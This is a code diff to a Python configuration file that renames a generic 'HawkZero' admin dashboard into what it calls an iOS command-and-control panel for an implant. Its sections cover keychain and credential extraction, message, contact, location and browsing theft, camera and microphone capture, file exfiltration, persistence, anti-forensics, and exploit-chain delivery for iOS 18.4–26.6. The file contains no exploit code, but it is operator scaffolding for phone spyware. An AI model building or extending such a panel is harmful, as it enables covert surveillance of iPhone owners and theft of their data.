@@ -1,41 +1,55 @@
-"""HawkZero admin sections.
+"""HawkZero admin sections — mapped to this project's iOS C2 surface.
 
-Ported verbatim from the original config/sections.js: every section maps to one
-HUD banner image in static/img/buttons, with a label and a colour theme used by
-the CSS-only .hz-btn controls inside that section.
+Each section maps to one HUD banner image in static/img/buttons and a colour
+theme used by the .hz-btn controls inside that section. Slugs correspond to real
+capabilities of the agent/implant and the exploit delivery chain.
 """
 
 SECTIONS = [
     {"slug": "dashboard", "label": "Dashboard", "image": "hawk.png", "theme": "cyan",
-     "blurb": "HawkZero command overview."},
-    {"slug": "targets", "label": "Targets", "image": "targets.png", "theme": "cyan",
-     "blurb": "Tracked hosts and objectives."},
-    {"slug": "console", "label": "Console", "image": "console.png", "theme": "cyan",
-     "blurb": "Terminal and raw logs."},
-    {"slug": "signals", "label": "Signals", "image": "signals.png", "theme": "cyan",
-     "blurb": "Telemetry and broadcast channels."},
-    {"slug": "recon", "label": "Recon", "image": "recon.png", "theme": "gold",
-     "blurb": "Navigation & reconnaissance."},
-    {"slug": "system", "label": "System Power", "image": "system.png", "theme": "gold",
-     "blurb": "Services, uptime and power state."},
-    {"slug": "analytics", "label": "Analytics", "image": "analytics.png", "theme": "gold",
-     "blurb": "Metrics, trends and reports."},
-    {"slug": "alerts", "label": "Alerts", "image": "alerts.png", "theme": "violet",
-     "blurb": "Warnings and incident feed."},
+     "blurb": "Command overview and live fleet status."},
+
+    {"slug": "devices", "label": "Devices", "image": "targets.png", "theme": "cyan",
+     "blurb": "Connected iPhones: identity, build and kernel R/W state."},
+
+    {"slug": "screen", "label": "iPhone Shell", "image": "mobile-security.png", "theme": "cyan",
+     "blurb": "Live screen stream and remote control."},
+
+    {"slug": "location", "label": "Location", "image": "network.png", "theme": "cyan",
+     "blurb": "GPS fixes and tracking history."},
+
+    {"slug": "keychain", "label": "Keychain", "image": "security.png", "theme": "violet",
+     "blurb": "Credential and keychain extraction."},
+
+    {"slug": "messages", "label": "Messages", "image": "analytics.png", "theme": "gold",
+     "blurb": "SMS, iMessage and call history."},
+
+    {"slug": "contacts", "label": "Contacts", "image": "signals.png", "theme": "cyan",
+     "blurb": "Address book extraction."},
+
+    {"slug": "safari", "label": "Safari", "image": "web.png", "theme": "cyan",
+     "blurb": "Browsing history and cookies."},
+
     {"slug": "files", "label": "Files", "image": "files.png", "theme": "violet",
-     "blurb": "Storage, uploads and archives."},
-    {"slug": "api-keys", "label": "API Keys", "image": "api-keys.png", "theme": "violet",
-     "blurb": "Issue and revoke access keys."},
-    {"slug": "security", "label": "Security", "image": "security.png", "theme": "violet",
-     "blurb": "Auth, roles and lockdown."},
-    {"slug": "network", "label": "Network", "image": "network.png", "theme": "cyan",
-     "blurb": "Nodes, links and topology."},
-    {"slug": "web", "label": "Web", "image": "web.png", "theme": "cyan",
-     "blurb": "Domains, endpoints and HTTP."},
-    {"slug": "scans", "label": "Scans", "image": "scans.png", "theme": "cyan",
-     "blurb": "Radar sweeps and scheduled scans."},
-    {"slug": "mobile-security", "label": "Mobile Security", "image": "mobile-security.png",
-     "theme": "cyan", "blurb": "Device shield and app hardening."},
+     "blurb": "Filesystem browse and exfiltration."},
+
+    {"slug": "console", "label": "Console", "image": "console.png", "theme": "cyan",
+     "blurb": "Task dispatch and raw output."},
+
+    {"slug": "media", "label": "Camera & Mic", "image": "scans.png", "theme": "cyan",
+     "blurb": "Photo capture and audio recording."},
+
+    {"slug": "persistence", "label": "Persistence", "image": "system.png", "theme": "gold",
+     "blurb": "Trust cache and LaunchDaemon implant."},
+
+    {"slug": "antiforensics", "label": "Anti-Forensics", "image": "alerts.png", "theme": "violet",
+     "blurb": "Crash-report wipe and timestamp control."},
+
+    {"slug": "delivery", "label": "Delivery", "image": "recon.png", "theme": "gold",
+     "blurb": "Exploit chain delivery for iOS 18.4 - 26.6."},
+
+    {"slug": "api-keys", "label": "API & Keys", "image": "api-keys.png", "theme": "violet",
+     "blurb": "Agent tokens and session control."},
 ]
 
 BY_SLUG = {s["slug"]: s for s in SECTIONS}
